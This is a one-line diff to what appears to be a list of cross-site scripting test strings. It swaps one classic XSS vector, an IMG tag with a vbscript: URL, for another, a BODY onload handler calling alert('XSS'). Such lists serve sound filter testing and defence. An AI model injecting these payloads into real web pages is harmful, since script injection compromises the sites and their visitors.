@@ -1,1 +1,1 @@
-<IMG SRC='vbscript:msgbox("XSS")'>
+<BODY ONLOAD=alert('XSS')>
